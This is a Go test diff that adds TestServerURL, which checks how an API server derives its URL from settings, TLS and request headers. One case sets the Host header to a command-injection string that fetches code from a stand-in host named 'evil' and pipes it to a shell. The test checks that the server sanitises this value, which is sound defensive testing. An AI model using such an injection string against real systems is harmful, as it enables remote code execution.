@@ -1,6 +1,7 @@
 package api
 
 import (
+	"crypto/tls"
 	"encoding/json"
 	"fmt"
 	"net/http"
@@ -223,6 +224,41 @@ func TestJoinTokenAndRevoke(t *testing.T) {
 			}
 			if rec := do(t, et.h, req); rec.Code != tt.wantCode {
 				t.Errorf("code = %d, want %d (%s)", rec.Code, tt.wantCode, rec.Body)
+			}
+		})
+	}
+}
+
+func TestServerURL(t *testing.T) {
+	t.Parallel()
+	tests := []struct {
+		name      string
+		publicURL string
+		tls       bool
+		proto     string
+		host      string
+		want      string
+	}{
+		{name: "public url wins", publicURL: "https://nudge.example.net", host: "10.0.0.5:8080", want: "https://nudge.example.net"},
+		{name: "plain http", host: "10.0.0.5:8080", want: "http://10.0.0.5:8080"},
+		{name: "own TLS", tls: true, host: "nudge.example.net", want: "https://nudge.example.net"},
+		{name: "TLS-terminating proxy", proto: "https", host: "nudge.example.net", want: "https://nudge.example.net"},
+		{name: "unsafe host", host: "x;curl evil|sh", want: "https://<server>"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			s := &server{publicURL: tt.publicURL}
+			r := httptest.NewRequest(http.MethodPost, "/api/v1/environments", nil)
+			r.Host = tt.host
+			if tt.tls {
+				r.TLS = &tls.ConnectionState{}
+			}
+			if tt.proto != "" {
+				r.Header.Set("X-Forwarded-Proto", tt.proto)
+			}
+			if got := s.serverURL(r); got != tt.want {
+				t.Errorf("serverURL = %q, want %q", got, tt.want)
 			}
 		})
 	}
